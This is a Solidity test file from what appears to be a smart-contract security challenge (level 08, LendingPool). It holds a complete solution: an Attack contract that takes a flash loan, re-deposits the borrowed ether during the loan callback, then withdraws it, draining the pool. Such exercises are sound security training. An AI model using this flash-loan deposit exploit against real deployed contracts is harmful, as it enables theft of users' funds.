// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "../src/08_LendingPool/LendingPool.sol";

// forge test --match-contract LendingPoolTest -vvvv
contract LendingPoolTest is BaseTest {
    LendingPool instance;

    function setUp() public override {
        super.setUp();
        instance = new LendingPool{value: 0.1 ether}();
    }

    function testExploitLevel() public {
        /* YOUR EXPLOIT GOES HERE */
        Attack attack = new Attack(instance);
        attack.attack();
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}

contract Attack is IFlashLoanReceiver {
    LendingPool public target;

    constructor(LendingPool _target) {
        target = _target;
    }

    function attack() external {
        target.flashLoan(address(target).balance);
        target.withdraw();
    }

    function execute() external payable override {
        target.deposit{value: msg.value}();
    }

    receive() external payable {}
}